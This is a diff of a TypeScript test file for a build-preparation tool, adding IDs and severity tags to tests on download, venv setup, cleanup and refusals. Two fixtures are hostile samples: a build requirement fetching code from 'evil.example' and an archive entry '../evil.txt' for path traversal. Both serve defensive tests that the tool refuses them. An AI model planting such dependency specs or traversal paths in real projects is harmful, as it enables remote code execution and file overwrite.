@@ -16,7 +16,7 @@ registerBuildBed();
 const sha256Of = (bytes: Uint8Array) => createHash('sha256').update(bytes).digest('hex');
 
 describe('preparing a build', () => {
-  test('downloads the archive of the pinned commit once, shows its checksum, sets up the venv with the engine Python and lists the build tools', async () => {
+  test('S2 downloads the archive of the pinned commit once, shows its checksum, sets up the venv with the engine Python and lists the build tools', { tags: ['standard'] }, async () => {
     const { builds, calls, seen, prepared, logs } = bed();
     const plan = await prepared();
     expect(seen).toEqual([SOURCE_URL]);
@@ -32,7 +32,7 @@ describe('preparing a build', () => {
     await builds.dispose();
   });
 
-  test('resolves the build requirements inside the private venv, not against the packages of the engine', async () => {
+  test('S2 resolves the build requirements inside the private venv, not against the packages of the engine', { tags: ['standard'] }, async () => {
     const { builds, calls, prepared } = bed();
     await prepared();
     const [runtime, specs] = engine.resolvePackages.mock.calls[0] ?? [];
@@ -41,7 +41,7 @@ describe('preparing a build', () => {
     await builds.dispose();
   });
 
-  test('stops with the log when the venv cannot be made, and removes its temporary folder', async () => {
+  test('S3 stops with the log when the venv cannot be made, and removes its temporary folder', { tags: ['standard'] }, async () => {
     behaviour.runs.venv = { status: 'failed', code: 1, lines: ['No module named ensurepip'] };
     const { calls, prepared, workOf } = bed();
     await expect(prepared()).rejects.toThrow('could not set up a private build folder');
@@ -49,7 +49,7 @@ describe('preparing a build', () => {
     expect(calls).toHaveLength(1);
   });
 
-  test('refuses a project whose build settings list a requirement it will not install, before any step runs', async () => {
+  test('K4 refuses a project whose build settings list a requirement it will not install, before any step runs', { tags: ['critical'] }, async () => {
     behaviour.served = archiveOf({ ...PROJECT_FILES, 'pyproject.toml': '[build-system]\nrequires = ["evil @ git+https://evil.example/evil.git"]\n' });
     const { builds, calls } = bed();
     const made = await builds.prepare(PLAN);
@@ -58,14 +58,14 @@ describe('preparing a build', () => {
     expect(calls).toEqual([]);
   });
 
-  test('refuses a source archive that holds a path out of its folder, before any step runs', async () => {
+  test('K4 refuses a source archive that holds a path out of its folder, before any step runs', { tags: ['critical'] }, async () => {
     behaviour.served = archiveOf({ ...PROJECT_FILES, '../evil.txt': 'x' });
     const { builds, calls } = bed();
     expect(JSON.stringify(await builds.prepare(PLAN))).toContain('will not unpack');
     expect(calls).toEqual([]);
   });
 
-  test('ends as cancelled and leaves no folder behind when it is cancelled while the source downloads', async () => {
+  test('S3 ends as cancelled and leaves no folder behind when it is cancelled while the source downloads', { tags: ['standard'] }, async () => {
     let started: () => void = () => undefined;
     const hasStarted = new Promise<void>((resolve) => { started = resolve; });
     const hanging: typeof fetch = (_input, init) => new Promise<Response>((_resolve, reject) => {
